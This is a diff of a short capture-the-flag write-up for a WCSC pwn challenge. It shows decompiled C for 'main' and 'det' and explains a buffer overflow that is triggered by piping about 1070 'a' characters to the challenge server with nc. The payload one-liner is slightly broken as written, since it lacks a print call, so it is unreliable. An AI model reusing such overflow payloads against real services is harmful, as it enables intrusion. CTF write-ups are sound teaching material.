@@ -1,5 +1,4 @@
 ---
-## 100 Too easy WCSC
 
 This one as the name suggests, was incredibly easy and honestly probably worth too many points, but here's a writeup regardless.
 
@@ -21,7 +20,7 @@ Now looking at `det` we see that `verWriteThisShit` is passed to the function an
 So even though the python script to run this like a normal exploit, it would be easier to just use `python -c '"a"*1070' ` and pipe the output to `nc wcscctf.org 8383`
 
 ```language-c
-int __cdecl main(int argc, const char **argv, const char **envp)
+int  main(int argc, const char **argv, const char **envp)
 {
   char buffer; // [sp+4h] [bp-424h]
   int overWriteThisSheet; // [sp+41Ch] [bp-Ch]
@@ -34,7 +33,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 ```
 
 ```language-c
-void __cdecl det(int overWriteThisSheet)
+void det(int overWriteThisSheet)
 {
   char buf; // [sp+Ch] [bp-8Ch]@2
   int fd; // [sp+8Ch] [bp-Ch]@2
